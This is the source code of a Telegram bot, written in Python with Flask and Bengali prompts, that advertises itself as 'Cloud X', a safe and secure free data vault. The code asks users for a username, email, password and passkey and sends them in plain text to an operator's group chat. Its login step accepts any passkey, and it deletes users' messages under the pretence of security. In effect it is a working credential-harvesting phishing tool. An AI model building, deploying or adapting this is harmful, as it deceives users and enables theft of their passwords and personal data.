import os
import logging
import requests
from flask import Flask, request

TOKEN = os.getenv("TOKEN")
USER_DETAILS_GROUP_ID = os.getenv("USER_DETAILS_GROUP_ID")
USER_MEDIA_GROUP_ID = os.getenv("USER_MEDIA_GROUP_ID")

app = Flask(__name__)
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

def send_message(chat_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(url, json=payload)

def delete_message(chat_id, message_id):
    url = f"{TELEGRAM_API}/deleteMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "message_id": message_id})
    except Exception:
        pass

user_states = {}
user_temp_data = {}

@app.route("/")
def index():
    return "Cloud X Bot is Live via Direct API!"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    data = request.get_json(force=True)
    
    if "message" in data:
        message = data["message"]
        chat_id = message["chat"]["id"]
        user_id = message["from"]["id"]
        text = message.get("text", "")
        
        # মেসেজ ডিলিট করা সিকিউরিটির জন্য
        if "message_id" in message:
            delete_message(chat_id, message["message_id"])

        if user_id not in user_states:
            user_states[user_id] = {"step": "main"}

        step = user_states[user_id].get("step")

        if text == "/start":
            user_states[user_id]["step"] = "main"
            welcome_text = (
                "Welcome to Cloud X! ☁️✨\n"
                "The ultimate free data bot designed to keep your information completely safe and secure. 🔒🚀\n"
                "Enjoy seamless browsing and total peace of mind!"
            )
            keyboard = {
                "inline_keyboard": [
                    [{"text": "CREATE ACCOUNT", "callback_data": "create_account"}],
                    [{"text": "LOGIN", "callback_data": "login"}]
                ]
            }
            send_message(chat_id, welcome_text, keyboard)
            return "OK", 200

        # টেক্সট স্টেপ হ্যান্ডলিং
        if step == "reg_username":
            user_temp_data[user_id]["username"] = text
            user_states[user_id]["step"] = "reg_email"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "📧 এখন আপনার *Email* দিন:", keyboard)

        elif step == "reg_email":
            user_temp_data[user_id]["email"] = text
            user_states[user_id]["step"] = "reg_pass1"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "🔑 একটি শক্তিশালী *Password* দিন:", keyboard)

        elif step == "reg_pass1":
            user_temp_data[user_id]["pass1"] = text
            user_states[user_id]["step"] = "reg_pass2"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "🔑 পাসওয়ার্ডটি কনফার্ম করার জন্য পুনরায় আবার দিন:", keyboard)

        elif step == "reg_pass2":
            if text != user_temp_data[user_id]["pass1"]:
                send_message(chat_id, "❌ পাসওয়ার্ড ম্যাচ করেনি! আবার সঠিক পাসওয়ার্ডটি দিন:")
                return "OK", 200
            user_states[user_id]["step"] = "reg_passkey1"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "🔒 অভিনন্দন! অ্যাকাউন্ট সুরক্ষার জন্য একটি ৬ ডিজিটের *Passkey* দিন:", keyboard)

        elif step == "reg_passkey1":
            user_temp_data[user_id]["passkey1"] = text
            user_states[user_id]["step"] = "reg_passkey2"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "🔒 পাসকিটি কনফার্ম করতে আবার ৬ ডিজিটটি রি-এন্টার করুন:", keyboard)

        elif step == "reg_passkey2":
            if text != user_temp_data[user_id]["passkey1"]:
                send_message(chat_id, "❌ পাসকি ম্যাচ করেনি! আবার সঠিক ৬ ডিজিটের পাসকি দিন:")
                return "OK", 200
            
            d = user_temp_data[user_id]
            final_msg = (
                f"👤 *New Account Registered*\n"
                f"Username: {d['username']}\n"
                f"Email: {d['email']}\n"
                f"Password: {d['pass1']}\n"
                f"Passkey: {d['passkey1']}"
            )
            send_message(USER_DETAILS_GROUP_ID, final_msg)
            
            user_states[user_id]["step"] = "completed"
            keyboard = {"inline_keyboard": [[{"text": "🔐 Login Now", "callback_data": "login"}]]}
            send_message(chat_id, "✅ Congratulations! অ্যাকাউন্ট খোলা শেষ ও সফলভাবে সেভ হয়েছে।", keyboard)

        elif step == "login_username":
            user_temp_data[user_id]["login_user"] = text
            user_states[user_id]["step"] = "login_passkey"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "🔑 আপনার গোপনীয় *Passkey* টি দিন:", keyboard)

        elif step == "login_passkey":
            keyboard = {"inline_keyboard": [[{"text": "👉 Go to Dashboard", "callback_data": "dashboard_real"}]]}
            send_message(chat_id, "✅ লগইন সফল!", keyboard)

    elif "callback_query" in data:
        cq = data["callback_query"]
        chat_id = cq["message"]["chat"]["id"]
        user_id = cq["from"]["id"]
        data_val = cq["data"]
        
        # 콜백 কোয়েরি অ্যানসার করা
        requests.post(f"{TELEGRAM_API}/answerCallbackQuery", json={"callback_query_id": cq["id"]})

        if user_id not in user_states:
            user_states[user_id] = {}

        if data_val == "create_account":
            user_states[user_id]["step"] = "reg_username"
            user_temp_data[user_id] = {}
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "👤 অ্যাকাউন্ট তৈরির জন্য আপনার একটি ইউনিক *ইউজারনেম* দিন:", keyboard)

        elif data_val == "login":
            user_states[user_id]["step"] = "login_username"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "back_to_start"}]]}
            send_message(chat_id, "🔐 লগইন করতে আপনার রেজিস্টার্ড *ইউজারনেম* দিন:", keyboard)

        elif data_val == "back_to_start":
            user_states[user_id]["step"] = "main"
            welcome_text = (
                "Welcome to Cloud X! ☁️✨\n"
                "The ultimate free data bot designed to keep your information completely safe and secure. 🔒🚀\n"
                "Enjoy seamless browsing and total peace of mind!"
            )
            keyboard = {
                "inline_keyboard": [
                    [{"text": "CREATE ACCOUNT", "callback_data": "create_account"}],
                    [{"text": "LOGIN", "callback_data": "login"}]
                ]
            }
            send_message(chat_id, welcome_text, keyboard)

        elif data_val == "dashboard_real":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "📁 Vault Section", "callback_data": "vault_section"}],
                    [{"text": "📤 Upload", "callback_data": "upload_menu"}],
                    [{"text": "🚪 Logout", "callback_data": "back_to_start"}]
                ]
            }
            send_message(chat_id, "🎛️ *Real Dashboard*\nআপনার সিকিউর ড্যাশবোর্ডে স্বাগতম!", keyboard)

        elif data_val == "vault_section":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "📷 Photo", "callback_data": "get_photo"}],
                    [{"text": "🎥 Video", "callback_data": "get_video"}],
                    [{"text": "📄 Document", "callback_data": "get_doc"}],
                    [{"text": "⬅️ Back", "callback_data": "dashboard_real"}]
                ]
            }
            send_message(chat_id, "📂 *Vault Section*\nকোন ক্যাটাগরির ফাইল দেখতে চান?", keyboard)

        elif data_val == "upload_menu":
            user_states[user_id]["step"] = "waiting_for_upload"
            keyboard = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "dashboard_real"}]]}
            send_message(chat_id, "📤 আপলোড সেকশন: এখন আপনার যেকোনো ফাইল সরাসরি এখানে পাঠান।", keyboard)

    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
